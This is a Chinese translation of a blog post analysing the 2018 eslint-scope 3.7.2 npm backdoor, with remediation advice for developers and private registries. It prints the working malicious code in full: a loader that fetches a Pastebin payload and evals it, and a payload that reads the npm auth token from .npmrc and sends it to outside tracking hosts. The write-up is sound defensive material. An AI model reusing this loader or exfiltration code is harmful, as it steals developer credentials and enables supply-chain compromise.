# ESLint 后门:它是什么以及如何解决这个问题

> 原文：<https://itnext.io/eslint-backdoor-what-it-is-and-how-to-fix-the-issue-221f58f1a8c8?source=collection_archive---------3----------------------->

![](img/18bd0227262c55bff09fa5dbb3dd161e.png)

图片鸣谢: [code.close()](https://flic.kr/p/5Y5QPG) by [文瑞蔡美儿](https://www.flickr.com/photos/ruiwen/)， [CC-BY-SA-2.0](https://creativecommons.org/licenses/by-sa/2.0/)

> 最初发表于[https://oprea.rocks/blog/fix-eslint-scope-backdoor](https://oprea.rocks/blog/fix-eslint-scope-backdoor/)

## 2018 年 7 月 12 日星期四下午 1:17 GMT[安德烈·米哈洛夫— @pronebird](https://github.com/pronebird) 报告了以下关于 [eslint-scope](https://github.com/eslint/eslint-scope) 模块的问题:[eslint-scope 中的病毒？](https://github.com/eslint/eslint-scope/issues/39)

它的要点是，有一些恶意代码添加到模块的代码库，受影响的版本是 3.7.2。我之所以说*是*，是因为 ESLint 团队迎难而上，在创纪录的时间内解决了问题— **谢谢！**

# 如何解决这个问题— [来源](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes#recommendations)

1.  立即撤销你所有的 NPM 代币！
2.  [为您的 NPM 帐户启用双因素身份认证](https://docs.npmjs.com/getting-started/using-two-factor-authentication)。如果你使用 Lerna 的话，下面就告诉你怎么做。
3.  限制可以发布到 NPM 的人数。
4.  注意你使用的自动依赖升级的服务。
5.  使用锁文件`package-lock.json`或`yarn.lock`，并锁定模块版本，以防止软件包自动升级到新版本。
6.  不要在任何地方使用相同的密码。使用密码管理器生成强密码，并安全地存储它们。

# 更长的版本

这个问题与下载 Pastebin 文档的内容并在当前 Node.js 进程的上下文中使用 eval 解释它的一段代码有关。

```
try {
  var https = require('https');
  https.get({
    'hostname': 'pastebin.com',
    path: '/raw/XLeVP82h',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
  }, (r) => {
    r.setEncoding('utf8');
    r.on('data', (c) => {
      eval(c);
    });
    r.on('error', () => {}); }).on('error', () => {});
} catch (e) {}
```

Pastebin 文档的内容在问题被提交和漏洞被公开后很长时间内都不可用，但幸运的是，人们在它被删除前得到了它。

```
try {
  var path = require('path');
  var fs = require('fs');
  var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, '.npmrc');
  var content = "nofile"; if (fs.existsSync(npmrc)) { content = fs.readFileSync(npmrc, {
      encoding: 'utf8'
    });
    content = content.replace('//registry.npmjs.org/:_authToken=', '').trim(); var https1 = require('https');
    https1.get({
      hostname: 'sstatic1.histats.com',
      path: '/0.gif?4103075&101',
      method: 'GET',
      headers: {
        Referer: 'http://1.a/' + content
      }
    }, () => {}).on("error", () => {});
    https1.get({
      hostname: 'c.statcounter.com',
      path: '/11760461/0/7b5b9d71/1/',
      method: 'GET',
      headers: {
        Referer: 'http://2.b/' + content
      }
    }, () => {}).on("error", () => {}); }
} catch (e) {}
```

从阅读代码片段中可以看出，代码从您的主目录中读取您的`.npmrc`文件。然后，它从中获取您的 NPM 身份验证令牌，并发送两个 HTTP 请求，一个发送给 [Histats](http://www.histats.com/) ，另一个发送给 [StatCounter](https://statcounter.com/) 。

作者创造性地将您的令牌放在 referrer URL 中，并使用两个域，这与 [Webpack](https://webpack.js.org/) 在进行代码拆分时创建您的包的方式非常相似。

很难说这实际上是在泄露敏感的身份验证凭证。

# 谁会受此影响？

基本上每个用 ESLint 的人。如果您在过去几天不幸安装了 ESLint，并且您将 *eslint-scope@3.7.2* 作为一个依赖项安装了——这是自动发生的——您会受到影响。

由于 ESLint 在前端和后端应用程序中都有使用，并且它或多或少地成为了代码质量的事实上的标准，所以爆炸半径可能是巨大的。

你能做的是立刻撤销你所有的 NPM 代币，并且创造新的代币。您还应该在您的 NPM 帐户上启用 2FA。

# 修复私有注册中心的问题

如果你运行的是私有注册表，比如 Nexus，你可能仍然会受到影响。你很可能在主注册中心后面有两个注册中心——一个是私有注册中心，在那里你存储和部署你的内部、公司模块，另一个是 npmjs.com 的代理。

代理可能会带来问题。寻找任何出现的 *eslint-scope@3.7.2* ，如果找到，立即取消发布！

您还应该扫描您的所有系统(您还安装了 dev dependencies)——这包括开发环境，但也包括构建/测试环境，并确保没有安装这个版本的模块。

作为一个附加的安全措施，确保每当你的应用程序经过你的开发环境时，你使用`npm install --prod`或`yarn install --prod`来安装你的节点模块。您需要审查和监督的模块将会减少。

# 进一步阅读

ESLint 核心团队迅速修复了该问题，并发布了一篇事后博客文章，详细说明了时间表、折衷的软件包以及软件包作者需要采取的应急措施。

可以在这里找到:[2018 年 7 月 12 日发布的针对恶意包的事后调查](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes)

如果你想进一步了解这个问题，请点击以下链接:

*   [GitHub 问题:eslint-scope 中的病毒？#39](https://github.com/eslint/eslint-scope/issues/39)
*   [blog.sqreen.io: ESLint 后门:撤销所有令牌](https://blog.sqreen.io/eslint-backdoor/)